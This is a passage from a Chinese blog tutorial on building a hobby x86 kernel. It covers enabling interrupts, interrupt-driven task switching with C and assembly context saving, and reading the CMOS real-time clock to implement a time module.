class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    console_init();</span><br><span class="line">    gdt_init();</span><br><span class="line">    interrupt_init();</span><br><span class="line">    <span class="comment">// task_init();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;sti\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;movl %eax, %eax\n&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">    u32 counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DEBUGK(<span class="string">&quot;looping in kernel init %d...\n&quot;</span>, counter++);</span><br><span class="line">        delay(<span class="number">1000000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/e2a5df11498569565a2bb9b96205f256.png" alt="image-20220316174332421" /></p><p>具体步骤</p><p>在handler.asm下断点</p><p><img src="https://img.joe1sn.top/uploads/big/eb8c658e45a90e708d5d516f9433a7eb.png" alt="image-20220317165523139" /></p><p>会发现调用中断的时间都用不同，从<code>asm volatile(&quot;sti\n&quot;);</code>之后，中断初始化完毕，开中断，标志寄存器<strong>IF</strong>位置<strong>1</strong>。则会调用中断处理函数</p><p><img src="https://img.joe1sn.top/uploads/big/b3b4e3eda6ed9a8779351e1cd83d1f9b.png" alt="image-20220317170757039" /></p><p>是因为CPU一直在监测中断，而不知道两个中断之间相隔多久，所以会这样乱序</p><h2 id="参考-6"><a class="markdownIt-Anchor" href="#参考-6"></a> 参考</h2><p><a href="https://datasheetspdf.com/datasheet/80486.html">https://datasheetspdf.com/datasheet/80486.html</a></p><p><a href="https://www.bilibili.com/video/BV14e411s7CN">https://www.bilibili.com/video/BV14e411s7CN</a></p><h1 id="操作系统实现-任务中断与上下文"><a class="markdownIt-Anchor" href="#操作系统实现-任务中断与上下文"></a> 操作系统实现-任务中断与上下文</h1><p>结合前面的知识，我们能否让中断帮助我们进行任务的切换</p><p><code>src/kernel/task.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">u32 _ofp <span class="title function_">thread_a</span><span class="params">()</span><span class="comment">//标及省略栈帧</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti\n&quot;</span>)</span>;<span class="comment">//开中断</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u32 _ofp <span class="title function_">thread_b</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti\n&quot;</span>)</span>;<span class="comment">//开中断</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们通过中断进行任务的切换，所以要修改默认中断入口函数，由于要保存上下文，所以<code>exception_handler</code>报错是要打印相关寄存器的值；而且为了实现效果要打开中断</p><p><code>src/kernel/interrupt.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">default_handler</span><span class="params">(<span class="type">int</span> <span class="built_in">vector</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    send_eoi(<span class="built_in">vector</span>);</span><br><span class="line">    schedule();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exception_handler</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">int</span> <span class="built_in">vector</span>,</span></span><br><span class="line"><span class="params">    u32 edi, u32 esi, u32 ebp, u32 esp,</span></span><br><span class="line"><span class="params">    u32 ebx, u32 edx, u32 ecx, u32 eax,</span></span><br><span class="line"><span class="params">    u32 gs, u32 fs, u32 es, u32 ds,</span></span><br><span class="line"><span class="params">    u32 vector0, u32 error, u32 eip, u32 cs, u32 eflags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *message = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">vector</span> &lt; <span class="number">22</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        message = messages[<span class="built_in">vector</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        message = messages[<span class="number">15</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;\nEXCEPTION : %s \n&quot;</span>, messages[<span class="built_in">vector</span>]);</span><br><span class="line">    printk(<span class="string">&quot;   VECTOR : 0x%02X\n&quot;</span>, <span class="built_in">vector</span>);</span><br><span class="line">    printk(<span class="string">&quot;    ERROR : 0x%08X\n&quot;</span>, error);</span><br><span class="line">    printk(<span class="string">&quot;   EFLAGS : 0x%08X\n&quot;</span>, eflags);</span><br><span class="line">    printk(<span class="string">&quot;       CS : 0x%02X\n&quot;</span>, cs);</span><br><span class="line">    printk(<span class="string">&quot;      EIP : 0x%08X\n&quot;</span>, eip);</span><br><span class="line">    printk(<span class="string">&quot;      ESP : 0x%08X\n&quot;</span>, esp);</span><br><span class="line">    <span class="comment">// 阻塞</span></span><br><span class="line">    hang();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pic_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    outb(PIC_M_DATA, <span class="number">0b11111110</span>); <span class="comment">// 关闭所有中断</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时为了保存上下文，要在中断处理时保存栈地相关信息并设置跳转</p><p><code>src/kernel/handler.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">interrupt_entry:</span><br><span class="line"></span><br><span class="line">    ;保存上下文</span><br><span class="line">    push ds</span><br><span class="line">    push es</span><br><span class="line">    push fs</span><br><span class="line">    push gs</span><br><span class="line">    pusha</span><br><span class="line"></span><br><span class="line">    ;找到压入的中断向量（因为保存了上下文）</span><br><span class="line">    mov eax, [esp + 12*4]</span><br><span class="line">    ;中断向量处理函数传递参数</span><br><span class="line">    push eax</span><br><span class="line"></span><br><span class="line">    ; 调用中断处理函数，handler_table 中存储了中断处理函数的指针</span><br><span class="line">    call [handler_table + eax * 4]</span><br><span class="line">    ; 对应 push %1，调用结束恢复栈</span><br><span class="line">    add esp, 4</span><br><span class="line"></span><br><span class="line">    ;回复上下文</span><br><span class="line">    popa</span><br><span class="line">    pop gs</span><br><span class="line">    pop fs</span><br><span class="line">    pop es</span><br><span class="line">    pop ds</span><br><span class="line"></span><br><span class="line">    add esp ,8</span><br><span class="line">    iret</span><br></pre></td></tr></table></figure><p>自然的<code>main.c</code>要初始化任务才行</p><p><code>src/kernel/main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">console_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">gdt_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">interrupt_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">clock_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">hang</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    console_init();</span><br><span class="line">    gdt_init();</span><br><span class="line">    interrupt_init();</span><br><span class="line">    task_init();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti&quot;</span>)</span>;</span><br><span class="line">    hang();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/f0af4fa8bcbc86e138b061745e570461.png" alt="image-20220319164652326" /></p><h1 id="操作系统实现-时钟"><a class="markdownIt-Anchor" href="#操作系统实现-时钟"></a> 操作系统实现-时钟</h1><h2 id="中断小结"><a class="markdownIt-Anchor" href="#中断小结"></a> 中断小结</h2><p>#操作系统实现-中断与系统调用</p><p>#操作系统实现-异常</p><p>#操作系统实现-外中断</p><p>之前已经有了3篇相关的文章，这里做一个较为具体的总结</p><h3 id="中断存在的意义"><a class="markdownIt-Anchor" href="#中断存在的意义"></a> 中断存在的意义</h3><ol><li>外部信息传递到CPU进行处理</li><li>跟更好的利用CPU：A任务等待输入输出时，中断后去处理B任务</li><li>计算机发生了某些异常，需要处理器立即执行一些操作：除0异常</li></ol><h2 id="外中断"><a class="markdownIt-Anchor" href="#外中断"></a> 外中断</h2><p>在8086时代，中断是通过两个信号线引入处理器的：</p><p><strong>NMI(None Maskable Interrupt，非屏蔽中断)</strong></p><ul><li><p>Intel规定：只有存在超过4个时钟周期的NMI才能被处理器识别</p></li><li><p>RAM：内存校验错</p></li><li><p>IOCHK：I/O校验错</p></li></ul><p><strong>INTR(Interrupt，可屏蔽中断)</strong></p><p>个人计算机中最常用的是中断代理：8259芯片</p><p><img src="https://img.joe1sn.top/uploads/big/aa1141e2db4a2c51816b030c226bd366.png" alt="" /></p><p>Intel允许使用256个中断，由图可知8256维持15个中断，并且8256中中断信号不固定，因此称为可编程中断控制器（Programmable Inpterrupt Controller，PIC）</p><p>又由图可知，要实现全部功能，需要两块8256进行芯片级联。</p><ul><li>使用时钟功能：主片IRQ2</li><li>使用实时时钟：主片连接int(IRQ2)-&gt;从片IRQ8-&gt;主片IR2</li></ul><h3 id="时钟-cmos-bcd编码"><a class="markdownIt-Anchor" href="#时钟-cmos-bcd编码"></a> 时钟、CMOS、BCD编码</h3><p><strong>RTC</strong></p><p>从简单的思路来说，你只需要一个实时时钟电路(Real Time Clock，RTC)和一个CMOS小块组成的静态存储器就可以实现时钟的功能。</p><p>一般的RTC是由振荡频率为32.768kHz的石英晶体振荡器驱动，分频过后进行每秒一次的刷新</p><p><strong>CMOS</strong></p><p>同样为了能让外部访问，该硬件有两个端口：</p><ul><li>CMOS 地址寄存器：0x70</li><li>CMOS 数据寄存器：0x71</li></ul><p>同时有时间信息（）</p><table><thead><tr><th>偏移值</th><th>意义</th></tr></thead><tbody><tr><td>0x1</td><td>CMOS_SECOND</td></tr><tr><td>0x3</td><td>CMOS_MINUTE</td></tr><tr><td>0x5</td><td>CMOS_HOUR</td></tr><tr><td>0xa</td><td>CMOS_Areg</td></tr><tr><td>0xb</td><td>CMOS_Breg</td></tr><tr><td>0xc</td><td>CMOS_Creg</td></tr><tr><td>0xd</td><td>CMOS_Dreg</td></tr><tr><td>0x80</td><td>CMOS_NMI</td></tr></tbody></table><p><strong>BCD</strong></p><p>BCD(Binary Coded Decimal)是CMOS RAM中保存时间信息的格式</p><h3 id="动态时钟的实现"><a class="markdownIt-Anchor" href="#动态时钟的实现"></a> 动态时钟的实现</h3><p>除非是计算机考古学家，否则直接上手很难，所以直接参(开)考(抄)Linux</p><p><a href="https://elixir.bootlin.com/linux/0.99.15j/source">/</a><a href="https://elixir.bootlin.com/linux/0.99.15j/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/0.99.15j/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/0.99.15j/source/include/linux/time.h">time.h</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LINUX_TIME_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _LINUX_TIME_H</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> &#123;</span></span><br><span class="line"><span class="type">long</span>tv_sec;<span class="comment">/* seconds */</span></span><br><span class="line"><span class="type">long</span>tv_usec;<span class="comment">/* microseconds */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> &#123;</span></span><br><span class="line"><span class="type">int</span>tz_minuteswest;<span class="comment">/* minutes west of Greenwich */</span></span><br><span class="line"><span class="type">int</span>tz_dsttime;<span class="comment">/* type of dst correction */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NFDBITS__NFDBITS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FD_SETSIZE__FD_SETSIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FD_SET(fd,fdsetp)__FD_SET(fd,fdsetp)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FD_CLR(fd,fdsetp)__FD_CLR(fd,fdsetp)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FD_ISSET(fd,fdsetp)__FD_ISSET(fd,fdsetp)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FD_ZERO(fdsetp)__FD_ZERO(fdsetp)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Names of the interval timers, and structure</span></span><br><span class="line"><span class="comment"> * defining a timer setting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>ITIMER_REAL0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>ITIMER_VIRTUAL1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>ITIMER_PROF2</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">itimerval</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">timeval</span> <span class="title">it_interval</span>;</span><span class="comment">/* timer interval */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">timeval</span> <span class="title">it_value</span>;</span><span class="comment">/* current value */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这个是Linux比较老的版本之一的，有点过时了，但是我们可以修改为</p><p><code>src/include/xsys/time.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_TIME_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_TIME_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tm</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> tm_sec;</span><br><span class="line">    <span class="type">int</span> tm_min;</span><br><span class="line">    <span class="type">int</span> tm_hour;</span><br><span class="line">    <span class="type">int</span> tm_mday;</span><br><span class="line">    <span class="type">int</span> tm_mon;</span><br><span class="line">    <span class="type">int</span> tm_year;</span><br><span class="line">    <span class="type">int</span> tm_wday;</span><br><span class="line">    <span class="type">int</span> tm_yday;</span><br><span class="line">    <span class="type">int</span> tm_isdst;<span class="comment">//夏令时标志</span></span><br><span class="line"></span><br><span class="line">&#125;tm;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">time_read_bcd</span><span class="params">(tm *time)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">time_read</span><span class="params">(tm *time)</span>;</span><br><span class="line"><span class="type">time_t</span> <span class="title function_">mktime</span><span class="params">(tm *time)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>接着便是：初始化时间</p><p><code>src/kernel/time.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/rtc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGK(fmt, args...) DEBUGK(fmt, ##args)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_ADDR 0x70 <span class="comment">// CMOS 地址寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_DATA 0x71 <span class="comment">// CMOS 数据寄存器</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面是 CMOS 信息的寄存器索引</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_SECOND 0x00  <span class="comment">// (0 ~ 59)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_MINUTE 0x02  <span class="comment">// (0 ~ 59)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_HOUR 0x04    <span class="comment">// (0 ~ 23)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_WEEKDAY 0x06 <span class="comment">// (1 ~ 7) 星期天 = 1，星期六 = 7</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_DAY 0x07     <span class="comment">// (1 ~ 31)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_MONTH 0x08   <span class="comment">// (1 ~ 12)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_YEAR 0x09    <span class="comment">// (0 ~ 99)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_CENTURY 0x32 <span class="comment">// 可能不存在</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_NMI 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINUTE 60          <span class="comment">// 每分钟的秒数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOUR (60 * MINUTE) <span class="comment">// 每小时的秒数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DAY (24 * HOUR)    <span class="comment">// 每天的秒数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YEAR (365 * DAY)   <span class="comment">// 每年的秒数，以 365 天算</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 每个月开始时的已经过去天数</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> month[<span class="number">13</span>] = &#123;</span><br><span class="line">    <span class="number">0</span>, <span class="comment">// 这里占位，没有 0 月，从 1 月开始</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    (<span class="number">31</span>),</span><br><span class="line">    (<span class="number">31</span> + <span class="number">29</span>),</span><br><span class="line">    (<span class="number">31</span> + <span class="number">29</span> + <span class="number">31</span>),</span><br><span class="line">    (<span class="number">31</span> + <span class="number">29</span> + <span class="number">31</span> + <span class="number">30</span>),</span><br><span class="line">    (<span class="number">31</span> + <span class="number">29</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span>),</span><br><span class="line">    (<span class="number">31</span> + <span class="number">29</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">30</span>),</span><br><span class="line">    (<span class="number">31</span> + <span class="number">29</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span>),</span><br><span class="line">    (<span class="number">31</span> + <span class="number">29</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">31</span>),</span><br><span class="line">    (<span class="number">31</span> + <span class="number">29</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">31</span> + <span class="number">30</span>),</span><br><span class="line">    (<span class="number">31</span> + <span class="number">29</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span>),</span><br><span class="line">    (<span class="number">31</span> + <span class="number">29</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">31</span> + <span class="number">30</span> + <span class="number">31</span> + <span class="number">30</span>)&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">time_t</span> startup_time;</span><br><span class="line"><span class="type">int</span> century;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里生成的时间可能和 UTC 时间有出入</span></span><br><span class="line"><span class="comment">// 与系统具体时区相关，不过也不要紧，顶多差几个小时</span></span><br><span class="line"><span class="type">time_t</span> <span class="title function_">mktime</span><span class="params">(tm *time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">time_t</span> res;</span><br><span class="line">    <span class="type">int</span> year; <span class="comment">// 1970 年开始的年数</span></span><br><span class="line">    <span class="comment">// 下面从 1900 年开始的年数计算</span></span><br><span class="line">    <span class="keyword">if</span> (time-&gt;tm_year &gt;= <span class="number">70</span>)</span><br><span class="line">        year = time-&gt;tm_year - <span class="number">70</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        year = time-&gt;tm_year - <span class="number">70</span> + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这些年经过的秒数时间</span></span><br><span class="line">    res = YEAR * year;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 已经过去的闰年，每个加 1 天</span></span><br><span class="line">    res += DAY * ((year + <span class="number">1</span>) / <span 